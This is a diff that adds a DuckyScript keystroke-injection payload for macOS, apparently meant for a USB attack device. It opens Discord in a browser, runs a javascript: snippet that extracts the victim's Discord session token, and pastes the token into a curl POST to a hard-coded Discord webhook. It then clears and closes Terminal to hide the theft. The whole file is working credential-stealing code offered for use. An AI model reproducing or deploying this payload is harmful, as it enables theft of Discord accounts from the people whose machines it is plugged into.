@@ -1,0 +1,38 @@
+DELAY 350
+GUI SPACE
+DELAY 350
+STRING https://discord.com/channels/@me
+DELAY 4000
+ENTER 
+DELAY 6000
+GUI l
+DELAY 350
+STRING javascript:(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()
+DELAY 500
+ENTER 
+DELAY 350
+GUI a
+DELAY 350
+GUI c
+DELAY 350
+GUI w
+DELAY 350
+GUI SPACE
+DELAY 1000
+STRING terminal
+DELAY 2000
+ENTER 
+DELAY 2000
+STRING curl -i --trace-ascii - -X POST https://discord.com/api/webhooks/996862834778570793/X3cb20jLNuQAw9svgJhNtYaAowzbyDDmpZeX6ektY_rOgg4AHdZlzAIaYwaqN0xtAHkI -H "Content-Type:application/json" --data '{"content": "
+DELAY 350
+GUI v
+DELAY 350
+STRING "}'
+DELAY 500
+ENTER 
+DELAY 500
+STRING reset
+DELAY 350
+ENTER 
+DELAY 2000
+GUI q
